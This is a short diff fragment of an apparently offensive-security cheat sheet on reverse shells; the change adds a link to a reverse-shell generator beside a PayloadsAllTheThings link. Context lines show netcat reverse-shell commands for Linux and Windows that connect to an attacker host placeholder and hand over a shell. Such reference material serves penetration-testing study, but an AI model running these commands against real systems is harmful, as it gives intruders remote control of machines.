@@ -266,7 +266,7 @@ nc $LHOST $LPORT -e /bin/bash
 ```
 nc.exe $LHOST $LPORT -e cmd.exe
 ```
-
+https://weibell.github.io/reverse-shell-generator/ \
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 
